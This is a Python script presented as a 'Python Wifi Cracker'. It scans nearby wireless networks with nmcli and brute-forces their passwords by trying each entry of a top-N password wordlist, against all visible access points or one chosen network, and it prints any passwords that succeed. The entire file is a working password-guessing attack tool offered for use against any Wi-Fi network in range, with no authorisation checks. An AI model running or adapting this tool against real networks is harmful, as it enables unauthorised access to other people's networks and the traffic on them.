#!/usr/bin/python3

import subprocess
from time import sleep
import sys

class Pywifi:
    def __init__(self):
        # initializing some Lists and Dictionaries
        self.listssids = []
        self.listpass = []
        self.pasizelist = [10, 20, 50, 100]
        self.passdict = {}

    def ssid(self):
        # Function to get list of SSIDs
        output = subprocess.run("nmcli dev wifi | cut -b 27-",
                                capture_output=True,
                                shell=True,
                                universal_newlines=True)
        list1 = output.stdout.split(sep='\n')
        # creating Another List to filter out useless things from list1
        list2 = []
        for i in list1:
            if 'SSID' in i:
                continue
            elif '--' in i:
                list1.remove(i)
            else:
                ss = i.partition("Infra")[0]
                list2.append(ss.rstrip().strip())
        list2.pop(-1)
        list2 = list(set(list2))
        # appending filtered list of ssids to main ssid list
        self.listssids = list2

    def passwd(self,size):
        # Opening a Password file According to Size Specified
        # Appending All Password to Main Password list
        if size:
            try:
                with open(f"top{size}.txt", 'r') as f:
                    for i in f.readlines():
                        self.listpass.append(i.rstrip("\n"))
            except:
                print("Invalid File Size ! Unable To Open Password File...")
                sys.exit(1)
        else:
            # Breaking the code if Password list Size not specified
            print("No Passwd File Selected")
            sys.exit(1)

    def trypass(self,verbosity):
        # Trying to Brute Force Every Wifi AP With A Password List
        verbose = verbosity.lower() == "y"  # check for Verbosity
        for i in self.listssids:
            for j in self.listpass:
                if verbose:
                    print(f"Trying WiFi {i} With Password {j}")
                else:
                    print(f"\rTrying WiFi {i} With Password {j}",end=" ")
                proc = subprocess.run(["nmcli","dev","wifi","connect",i,"password",j],
                                    capture_output=True,
                                    text=True)
                sleep(1)
                if proc.returncode == 0:
                    # If Password is Correct , Adding it to Main Passwd Dictionary
                    self.passdict[i] = j
                    print(f"\nGot Pass {j} For WiFi {i}")
                    print()
                    sleep(1)
                else:
                    if verbose:
                        print(f"Password {j} is not Correct For WiFi {i}")
                        print()
                    sleep(1)
    def trypasssingle(self,ssidname,verbosity):
        # Trying Brute Force on a Single WiFi AP With Password List
        verbose = verbosity.lower() == "y"
        # Checking WiFi AP is Available or Not In SSID list
        if ssidname not in self.listssids:
            print("WiFi Name is Incorrect ! Not Found...")
            sys.exit(1)
        for i in self.listpass:
            if verbose:
                print(f"Trying WiFi {ssidname} With Password {i}")
            else:
                print(f"\rTrying WiFi {ssidname} With Password {i}",end=" ")
            proc = subprocess.run(["nmcli", "dev", "wifi", "connect", ssidname, "password", i],
                                  capture_output=True,
                                  text=True)
            sleep(1)
            if proc.returncode == 0:
                # If Password is Correct , Adding it to Main Passwd Dictionary
                self.passdict[ssidname] = i
                print(f"\nGot Pass {i} For WiFi {ssidname}")
                print()
                sleep(1)
            else:
                if verbose:
                    print(f"Password {i} is not Correct For WiFi {ssidname}")
                    print()
                sleep(1)
#############################################################################################################

    def logo(self):
        # Logo For Our WiFi Bruter Program
        print("""

'##:::::'##:'####:'########:'####::::'########::'########::'##::::'##:'########:'########:'########::
 ##:'##: ##:. ##:: ##.....::. ##::::: ##.... ##: ##.... ##: ##:::: ##:... ##..:: ##.....:: ##.... ##:
 ##: ##: ##:: ##:: ##:::::::: ##::::: ##:::: ##: ##:::: ##: ##:::: ##:::: ##:::: ##::::::: ##:::: ##:
 ##: ##: ##:: ##:: ######:::: ##::::: ########:: ########:: ##:::: ##:::: ##:::: ######::: ########::
 ##: ##: ##:: ##:: ##...::::: ##::::: ##.... ##: ##.. ##::: ##:::: ##:::: ##:::: ##...:::: ##.. ##:::
 ##: ##: ##:: ##:: ##:::::::: ##::::: ##:::: ##: ##::. ##:: ##:::: ##:::: ##:::: ##::::::: ##::. ##::
. ###. ###::'####: ##:::::::'####:::: ########:: ##:::. ##:. #######::::: ##:::: ########: ##:::. ##:
:...::...:::....::..::::::::....:::::........:::..:::::..:::.......::::::..:::::........::..:::::..::

        """)

    def run(self):
        # Running Main Run Function to Interactively ask the user For Functioning...
        self.ssid()
        self.logo()
        print()
        print("Welcome To Python Wifi Cracker")
        print("Select A Option... ")
        print("""
        1) Show WiFi List
        2) Show Passwd List
        3) Run Brute Force on All WiFi
        4) Run Brute Force on Single WiFi
        
        """)
        # Asking user What He Wants To do and running functions accordingly
        opt = int(input("Enter Your choice (1,2,3,4) :- "))
        if opt == 1:
            print("~" * 25)
            for i in self.listssids:
                print(i)
            print("~" * 25)
        elif opt == 2:
            pasize = int(input("Enter Password File Size (10,20,50,100) :- "))
            if pasize not in self.pasizelist:
                print("Enter a Valid Password List Size")
                sys.exit(1)
            self.passwd(pasize)
            print("~" *25)
            for i in self.listpass:
                print(i)
            print("~" * 25)
        elif opt == 3:
            verbosity = input("Do You Want Verbose Output y/N :- ")
            pasize = int(input("Enter Password File Size (10,20,50,100) :- "))
            if pasize not in self.pasizelist:
                print("Enter a Valid Password List Size")
                sys.exit(1)
            self.passwd(pasize)
            sleep(1)
            print("~" * 25)
            for i in self.listssids:
                print(i)
            print("~" * 25)
            self.trypass(verbosity)
            if not self.passdict:
                print("\nSorry Boss ! No Password Found <>_<>")
            else:
                print("These are The Password Found...")
                print(self.passdict)
        elif opt == 4:
            ssidname = input("Enter WiFi Name Here :- ")
            verbosity = input("Do You Want Verbose Output y/N :- ")
            pasize = int(input("Enter Password File Size (10,20,50,100) :- "))
            if pasize not in self.pasizelist:
                print("Enter a Valid Password List Size")
                sys.exit(1)
            self.passwd(pasize)
            sleep(1)
            self.trypasssingle(ssidname,verbosity)
            if not self.passdict:
                print("\nSorry Boss ! No Password Found <>_<>")
            else:
                print("These are The Password Found...")
                print(self.passdict)

if __name__ == '__main__':
    obj = Pywifi()
    obj.run()